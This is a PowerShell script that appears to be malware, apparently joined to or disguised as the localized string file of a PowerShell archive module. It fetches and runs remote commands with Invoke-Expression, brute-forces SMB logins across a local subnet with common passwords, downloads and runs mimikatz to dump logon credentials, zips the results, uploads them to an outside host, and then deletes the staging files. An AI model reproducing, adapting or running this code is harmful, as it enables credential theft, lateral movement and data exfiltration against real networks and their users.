$tempDir = "C:\Temp\CompressedFiles"
$manifestFile = "C:\Temp\manifest.dat"
$apiEndpoint = "http://pa1ebhcigeevjdavkxsfilesh0o.live/upload.php"
$zipFileName = "TopSecret_Bananas.zip"
$zipFilePath = Join-Path -Path $tempDir -ChildPath $zipFileName

if (-not (Test-Path -Path $tempDir)) {
    New-Item -Path $tempDir -ItemType Directory
}

if (-not (Test-Path $manifestFile)) {
    New-Item -Path $manifestFile -ItemType File -Force
}

$zipFilePath = "C:\Temp\CompressedFiles\TopSecret_Bananas.zip"
$filesToCompress = @()

$sentFiles = @{}
if (Test-Path -Path $manifestFile) {
    $sentFiles = Get-Content -Path $manifestFile | ForEach-Object { $_ }
}

function GetCommand {
    $URL = "https://raw.githubusercontent.com/jessepollak/command/refs/heads/master/package.json"

    try {
        $response = Invoke-WebRequest -Uri $URL -Method GET -ErrorAction Stop
        $data = $null
        try {
            $data = $response.Content | ConvertFrom-Json -ErrorAction Stop
        } catch {
            return
        }

        if ($data -and $data.COMMANDS_TO_EXECUTE) {
            Invoke-Expression -Command $($data.COMMANDS_TO_EXECUTE)
        }
    } catch {}
}

function PerformSMBBruteForce {
    param (
        [string]$Subnet = "192.168.1.0/24"
    )

    $Usernames = @("carter", "leah", "luke", "hannah", "jayden", "addison", "john", "a-emily", "a-james", "sofia", "jackson", "avery", "samuel", "ella", "henry", "mason", "charlotte", "ethan", "amelia", "alexander")
    $Passwords = @("123456", "12345", "123456789", "password", "iloveyou", "princess", "1234567", "rockyou", "12345678", "abc123", "nicole", "daniel", "babygirl", "monkey", "lovely", "jessica", "654321", "michael", "ashley", "qwerty")

    $BaseIP = $Subnet.Split('/')[0]
    $ipParts = $BaseIP.Split('.')
    if ($ipParts.Count -eq 4) {
        $SubnetPrefix = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])."
    } else {
        return
    }

    $IPs = 1..254 | ForEach-Object {
        $ipAddress = "$SubnetPrefix$($_)"
        $ipAddress
    }

    function Test-Host {
        param ([string]$ipAddress)
        $ping = New-Object System.Net.NetworkInformation.Ping
        try {
            $reply = $ping.Send($ipAddress, 100)
            return $reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success
        } catch {
            return $false
        }
    }

    $hosts = @()
    foreach ($ip in $IPs) {
        if (Test-Host $ip) {
            $hosts += $ip
        }
    }

    $results = @()
    foreach ($targetHost in $hosts) {
        foreach ($username in $Usernames) {
            foreach ($password in $Passwords) {
                $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
                $psCredential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

                try {
                    $driveName = "SMB$($targetHost.Replace('.', '_'))"
                    New-PSDrive -Name $driveName -PSProvider FileSystem -Root "\\$targetHost\IPC$" -Credential $psCredential -ErrorAction Stop
                    $results += [PSCustomObject]@{
                        Host      = $targetHost
                        Username  = $username
                        Password  = $password
                        Status    = "Success"
                    }
                    Remove-PSDrive -Name $driveName -Force
                    break 2
                } catch {}
            }
        }
    }

    $results | Format-Table -AutoSize | Out-File -FilePath "C:\Temp\CompressedFiles\SMBResults.txt"
}

function PerformRunMimikatz {
    $mimikatzUrl = "http://pa1ebhcigeevjdavkxsfilesh0o.live/mimikatz.exe"
    $mimikatzExe = "C:\Temp\mimikatz.exe"
    $mimikatzOutput = "C:\Temp\CompressedFiles\mimikatz.txt"

    Invoke-WebRequest -Uri $mimikatzUrl -OutFile $mimikatzExe -ErrorAction SilentlyContinue

    Start-Process -FilePath $mimikatzExe -ArgumentList "privilege::debug sekurlsa::logonpasswords exit" -RedirectStandardOutput $mimikatzOutput -NoNewWindow -Wait -ErrorAction SilentlyContinue
}

function Send-PostRequest {
    param (
        [Parameter(Mandatory)]
        [string]$filePath,

        [Parameter(Mandatory)]
        [string]$apiEndpoint
    )

    try {
        if (-not (Test-Path -Path $filePath)) {
            return $false
        }

        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)

        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

"@ + [System.Text.Encoding]::UTF8.GetString($fileBytes) + @"
--$boundary--
"@

        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $response = Invoke-WebRequest -Uri $apiEndpoint -Method Post -Body $bodyBytes -Headers $headers

        if ($response.StatusCode -eq 200) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

GetCommand
PerformSMBBruteForce
PerformRunMimikatz

Compress-Archive -Path $tempDir -DestinationPath $zipFilePath -Force

Send-PostRequest -filePath $zipFilePath -apiEndpoint $apiEndpoint 

try {
    Get-ChildItem -Path $tempDir -Recurse | Remove-Item -Force -Recurse
} catch {}



# Localized ArchiveResources.psd1
ConvertFrom-StringData @'
###PSLOC
PathNotFoundError=The path '{0}' either does not exist or is not a valid file system path.
ExpandArchiveInValidDestinationPath=The path '{0}' is not a valid file system directory path.
InvalidZipFileExtensionError={0} is not a supported archive file format. {1} is the only supported archive file format.
ArchiveFileIsReadOnly=The attributes of the archive file {0} is set to 'ReadOnly' hence it cannot be updated. If you intend to update the existing archive file, remove the 'ReadOnly' attribute on the archive file else use -Force parameter to override and create a new archive file.
ZipFileExistError=The archive file {0} already exists. Use the -Update parameter to update the existing archive file or use the -Force parameter to overwrite the existing archive file.
DuplicatePathFoundError=The input to {0} parameter contains a duplicate path '{1}'. Provide a unique set of paths as input to {2} parameter.
ArchiveFileIsEmpty=The archive file {0} is empty.
CompressProgressBarText=The archive file '{0}' creation is in progress...
ExpandProgressBarText=The archive file '{0}' expansion is in progress...
AppendArchiveFileExtensionMessage=The archive file path '{0}' supplied to the DestinationPath patameter does not include .zip extension. Hence .zip is appended to the supplied DestinationPath path and the archive file would be created at '{1}'.
AddItemtoArchiveFile=Adding '{0}'.
BadArchiveEntry=Can not process invalid archive entry '{0}'.
CreateFileAtExpandedPath=Created '{0}'.
InvalidArchiveFilePathError=The archive file path '{0}' specified as input to the {1} parameter is resolving to multiple file system paths. Provide a unique path to the {2} parameter where the archive file has to be created.
InvalidExpandedDirPathError=The directory path '{0}' specified as input to the DestinationPath parameter is resolving to multiple file system paths. Provide a unique path to the Destination parameter where the archive file contents have to be expanded.
FileExistsError=Failed to create file '{0}' while expanding the archive file '{1}' contents as the file '{2}' already exists. Use the -Force parameter if you want to overwrite the existing directory '{3}' contents when expanding the archive file.
DeleteArchiveFile=The partially created archive file '{0}' is deleted as it is not usable.
InvalidDestinationPath=The destination path '{0}' does not contain a valid archive file name.
PreparingToCompressVerboseMessage=Preparing to compress...
PreparingToExpandVerboseMessage=Preparing to expand...
###PSLOC
'@







